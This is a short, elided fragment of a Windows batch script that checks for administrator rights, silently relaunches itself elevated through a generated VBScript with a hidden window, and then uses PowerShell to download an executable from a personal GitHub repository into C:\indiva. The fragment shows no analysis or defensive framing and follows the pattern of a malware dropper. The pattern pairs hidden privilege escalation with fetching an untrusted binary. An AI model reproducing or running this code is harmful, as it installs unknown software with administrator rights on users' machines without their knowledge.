...
fsutil dirty query %systemdrive% >nul 2>&1 || (
  ...
  echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %*", "", "runas", 0 >> "%temp%\%p2%"
  "%temp%\%p2%"
  exit /b
)
...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/46fyr/raw/main/IndivaProjects.exe' -OutFile 'C:\indiva\indiva.exe'"
